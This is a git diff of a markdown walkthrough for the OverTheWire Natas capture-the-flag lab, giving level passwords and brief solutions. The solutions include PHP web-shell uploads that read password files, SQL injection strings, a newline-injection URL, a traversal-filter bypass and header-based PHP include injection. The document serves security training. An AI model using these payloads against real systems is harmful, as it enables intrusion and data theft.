@@ -20,7 +20,8 @@ natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
 
 ## natas5:
 send request from natas5 to find the password
-
+![natas5](natas-scripts/natas5.py)
+```python
 import requests
 url  = "http://natas4.natas.labs.overthewire.org/"
 referer = "http://natas5.natas.labs.overthewire.org/"
@@ -31,6 +32,7 @@ s.headers.update({'referer': referer })
 r = s.get(url)
 
 print(r.text)
+```
 
 
 ## natas6:
@@ -67,67 +69,78 @@ password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
 read all files using a wildcard
 .* /etc/natas_webpass/natas11
 
+![natas11](natas-scripts/natas11.py)
+
 password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
 
 ## natas12:
 known plaintext attack
-check the script natas11.py
-
+check the script [natas11](natas-scripts/natas11.py)
+[natas12](natas-scripts/natas12.php)
 password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 
 
 ## natas13:
 upload php file to print the password
-
+```php
 <? php echo system("cat /etc/natas_webpass/natas13"); ?>
+```
+
 change the extension by intercepting the POST request in burp suite
 
 password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 
 ## natas14:
 use bitmap file extension instead of php
+```php
 BMP<?
 echo system("cat /etc/natas_webpass/natas14"); 
 ?>
+```
 
 password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
 
 ## natas15
+![natas15](natas-scripts/natas15.py)
 SQL injection
 user" OR 1=1#
 
 password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
 
 ## natas16:
+![natas16](natas-scripts/natas16.py)
 Blind SQL injection
 See natas15.py script 
 password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 
 ## natas17:
+![natas17](natas-scripts/natas17.py)
 Blind command substitution, i.e. we insert a command that returns TRUE or FALSE for the character being in the password
 
-see natas16.py script 
+see script ![natas16](natas-scripts/natas16.py)
 condition is TRUE => len(r.text ) == 1105
 condition is FALSE => len(r.text) =!= 1105 
 password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
 
 ## natas18:
+![natas18](natas-scripts/natas18.py)
 Blind SQL injection with sleep for checking condition
 
-see natas17.py script
+see ![natas17](natas-scripts/natas17.py) script
 
 password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 
 ## natas19:
+![natas19](natas-scripts/natas19.py)
 We bruteforce the value of the PHPSESSID of admin (between 0 and 640)
-see natas18.py script
+see ![natas18](natas-scripts/natas18.py) script
 
 password : tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
 
 ## natas20:
 Same as natas18 but the IDs are not sequential
 The ID is in Hex  str(x for x in 1000)-{username}
-see natas19.py script
+see ![natas19](natas-scripts/natas19.py) script
 
 password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
 
@@ -135,8 +148,11 @@ password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
 with ?debug as a param in the url, we inject admin admin1 in the username .
 in the `mywrite()` function, we are writing each `$key` and `$value` pair with a new line, so we inject `admin 1` with a new line.
 
-We can use this payload directly: http://natas20.natas.labs.overthewire.org/index.php?debug&name=admin%0Aadmin%201
+We can use this payload directly: 
 
+```bash
+http://natas20.natas.labs.overthewire.org/index.php?debug&name=admin%0Aadmin%201
+```
 password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
 
 ## natas22
@@ -164,6 +180,8 @@ Try to show the warning for the strcmp function:
 password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
 
 ## natas26:
+![natas26 py script ](natas-scripts/natas26.py)
+![natas26 php payload](natas-scripts/natas26.php)
 inject the path for the password in the lang parameter
 Since the code checks for `../` for stopping directory traversal, we will bypass that by using `.../.../` instead
 Then we inject `<?php include '/etc/natas_webpass/natas26'; ?>` in `User-Agent` header
@@ -171,6 +189,7 @@ Then we inject `<?php include '/etc/natas_webpass/natas26'; ?>` in `User-Agent` 
 password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 
 ## natas27:
+![natas27](natas-scripts/natas27.py)
 In the drawing cookie we decode from base64 then we unserialize the PHP code
 ```php
 array (
@@ -185,7 +204,7 @@ array (
 ```
 So we can  create a custom version of **Logger**, serialize our malicious img payload, base64 encode it, then inject it in the drawing cookie
 
-see natas26.php / natas26.py script for the creation of the cookie
+see [natas26 php payload](natas-scripts/natas26.php) / [natas26 py script ](natas-scripts/natas26.py) for the creation of the cookie
 
 password: u3RRffXjysjgwFU6b9xa23i6prmUsYne
 
@@ -195,7 +214,7 @@ We first create a new natas28 user as following:
 `printf 'natas28%64s%s\n' '' 'something'`
 We login with natas28 with empty password to find the password for natas28
 
-see natas28.py script 
+see ![natas28](natas-scripts/natas28.py) script 
 
 password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
 
@@ -209,7 +228,7 @@ So to bypass the input sanitization, we use the following query:
 Block 1 --------- Block 2 ------------------- Block x -------------
 AAAAAAAAAA'  | SQL injection (10 chars) | more sqli (10 chars)
 
-see natas29.py / natas29fixed.py scripts
+see ![natas29](natas-scripts/natas29.py) / ![natas29fixed](natas-scripts/natas29fixed.py) scripts
 
 password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
 
@@ -225,7 +244,7 @@ password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
 We found a Mysql database in the source code => sql injection
 quote() sanitizes input by removing quotations BUT vulnerable to **array injection**
 
-See natas30.py script
+See ![natas30](natas-scripts/natas30.py) script
 
 password: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
 
@@ -255,7 +274,7 @@ password: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
 
 ## natas34:
 Vulnerability in PHP deserialization. Check this [paper](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It%27s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)
-Interesting writeup: https://anyafachri.medium.com/rce-via-php-archive-metadata-deserialization-natas33-level-finale-overthewire-write-up-bddbb3818618
+Interesting writeup: [RCE via PHP Archive Metadata Deserialization: Natas33 Level Finale Overthewire Write Up | by Asrofil Fachrul Riidlo | Medium](https://anyafachri.medium.com/rce-via-php-archive-metadata-deserialization-natas33-level-finale-overthewire-write-up-bddbb3818618)
 
 password: j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
 
